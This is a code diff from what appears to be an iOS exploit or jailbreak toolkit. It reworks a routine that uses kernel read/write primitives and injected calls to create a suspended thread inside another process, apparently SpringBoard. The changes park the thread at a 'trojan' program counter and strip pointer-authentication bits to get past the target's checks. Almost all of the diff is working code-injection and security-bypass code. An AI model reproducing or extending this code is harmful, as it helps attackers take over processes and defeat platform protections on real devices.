@@ -1789,80 +1789,68 @@ int init_remote_call(const char* process, bool useMigFilterBypass) {
         return -1;
     }
 
-    // 6ca6b91 DIAG: remap canary stuck DEAD while SB memcpy(bounce,out) got 0
-    // → our stack remap ≠ SB's live stack page. Plant canary via SB memcpy
-    // (heap→stack) so the canary lands on the real stack SB uses.
-    uint64_t bounce = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
-    if (!g_RC_success || !bounce) {
-        RC_DIAG("malloc bounce failed");
-        fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
-        return -1;
-    }
+    // Use HEAP buffer for pthread_t output — stack SP-0x100 is inside
+    // pthread_create_suspended_np's own frame; function prologue clobbers it
+    // before writing *thread, so output stays at canary.
     const uint64_t kCanary = 0xDEADBEEFCAFEBABEULL;
-    // Heap remap is known-good (prior roundtrip). Write canary there, then
-    // SB memcpy onto stack out-ptr.
-    if (!remote_write64(bounce, kCanary)) {
-        RC_DIAG("canary remote_write to bounce FAILED");
-        do_remote_call_temp(100, "free", bounce, 0, 0, 0, 0, 0, 0, 0);
+    uint64_t heapOut = do_remote_call_temp(100, "malloc", 16, 0, 0, 0, 0, 0, 0, 0);
+    if (!g_RC_success || !heapOut) {
+        RC_DIAG("malloc heapOut failed");
         fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
         return -1;
     }
-    do_remote_call_temp(100, "memcpy", trojanMemTemp, bounce, 8, 0, 0, 0, 0, 0);
-    // Verify SB sees canary on stack (memcpy bounce←out).
-    do_remote_call_temp(100, "memset", bounce, 0, 8, 0, 0, 0, 0, 0);
-    do_remote_call_temp(100, "memcpy", bounce, trojanMemTemp, 8, 0, 0, 0, 0, 0);
-    clear_remote_shmem_cache();
-    uint64_t canarySB = remote_read64(bounce);
-    clear_remote_shmem_cache();
-    uint64_t canaryRemap = remote_read64(trojanMemTemp);
-    RC_DIAG("pre-create canary SB=0x%llx remap=0x%llx (expect DEAD; remap may mismatch)",
-            (unsigned long long)canarySB, (unsigned long long)canaryRemap);
-    if (canarySB != kCanary) {
-        RC_DIAG("SB stack plant failed — cannot trust out slot");
-        do_remote_call_temp(100, "free", bounce, 0, 0, 0, 0, 0, 0, 0);
+    // Plant canary in heap buffer for diagnostics
+    if (!remote_write64(heapOut, kCanary)) {
+        RC_DIAG("canary remote_write to heapOut FAILED");
+        do_remote_call_temp(100, "free", heapOut, 0, 0, 0, 0, 0, 0, 0);
         fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
         return -1;
     }
+    RC_DIAG("heapOut=0x%llx canary planted", (unsigned long long)heapOut);
 
-    // 5eca9e0 DIAG: canary SB=DEAD before AND after create with PAC'd 0x301
-    // start_routine → libpthread rejects unmapped PC, returns 0, never stores
-    // pthread_t. Use shared-cache getpid (stripped) so create materializes the
-    // thread; park at FAKE_PC_TROJAN via thread_set_state before resume.
-    // (Fl0rk/Cyanide pass PAC'd 0x301 — works on their targets; SB here rejects.)
+    // Fl0rk-style: start_routine = stripped shared-cache getpid (valid code page).
+    // pthread_create_suspended_np creates thread but never runs it; park at
+    // FAKE_PC_TROJAN via thread_set_state before resume.
     uint64_t startRoutine = native_strip((uint64_t)dlsym(RTLD_DEFAULT, "getpid"));
     if (!startRoutine) {
         RC_DIAG("dlsym(getpid) strip failed");
-        do_remote_call_temp(100, "free", bounce, 0, 0, 0, 0, 0, 0, 0);
+        do_remote_call_temp(100, "free", heapOut, 0, 0, 0, 0, 0, 0, 0);
         fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
         return -1;
     }
-    RC_DIAG("pthread start=stripped_getpid 0x%llx (not PAC 0x301 — SB rejects)",
-            (unsigned long long)startRoutine);
+    RC_DIAG("pthread start=getpid 0x%llx heapOut=0x%llx",
+            (unsigned long long)startRoutine, (unsigned long long)heapOut);
 
     uint64_t createResult = do_remote_call_temp(100, "pthread_create_suspended_np",
-                                                trojanMemTemp, 0, startRoutine, 0, 0, 0, 0, 0);
+                                                heapOut, 0, startRoutine, 0, 0, 0, 0, 0);
     if (!g_RC_success || createResult != 0) {
         RC_DIAG("pthread_create failed result=%llu success=%d",
                 (unsigned long long)createResult, (int)g_RC_success);
-        do_remote_call_temp(100, "free", bounce, 0, 0, 0, 0, 0, 0, 0);
+        do_remote_call_temp(100, "free", heapOut, 0, 0, 0, 0, 0, 0, 0);
         fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
         return -1;
     }
 
-    // Read via SB MMU (authoritative).
-    do_remote_call_temp(100, "memset", bounce, 0, 8, 0, 0, 0, 0, 0);
-    do_remote_call_temp(100, "memcpy", bounce, trojanMemTemp, 8, 0, 0, 0, 0, 0);
+    // Read pthread_t directly from heap via kernel R/W (authoritative).
     clear_remote_shmem_cache();
-    uint64_t pthreadAddr = remote_read64(bounce);
-    RC_DIAG("post-pthread SB=0x%llx out=0x%llx",
-            (unsigned long long)pthreadAddr, (unsigned long long)trojanMemTemp);
-    do_remote_call_temp(100, "free", bounce, 0, 0, 0, 0, 0, 0, 0);
+    uint64_t pthreadAddr = remote_read64(heapOut);
+    RC_DIAG("post-pthread heapOut=0x%llx pthreadAddr=0x%llx",
+            (unsigned long long)heapOut, (unsigned long long)pthreadAddr);
+    // Also try reading via SB memcpy for cross-check
+    do_remote_call_temp(100, "memcpy", heapOut, heapOut, 8, 0, 0, 0, 0, 0);
+    clear_remote_shmem_cache();
+    uint64_t pthreadAddrSB = remote_read64(heapOut);
+    RC_DIAG("post-pthread SB-memcpy pthreadAddr=0x%llx",
+            (unsigned long long)pthreadAddrSB);
+    if (pthreadAddrSB && pthreadAddrSB != kCanary && pthreadAddr != kCanary)
+        pthreadAddr = pthreadAddrSB; // prefer SB view if both valid
+    do_remote_call_temp(100, "free", heapOut, 0, 0, 0, 0, 0, 0, 0);
 
     if (!pthreadAddr || pthreadAddr == kCanary) {
         if (pthreadAddr == kCanary) {
-            RC_DIAG("create ret=0 but SB out still CANARY — start still rejected");
+            RC_DIAG("heapOut still CANARY — pthread_create_suspended_np did NOT write *thread");
         } else {
-            RC_DIAG("create ret=0 SB out=0");
+            RC_DIAG("pthreadAddr=0 after create");
         }
         fail_after_creator_park(RemoteCallInitFailurePthreadCreate, targetPid);
         return -1;
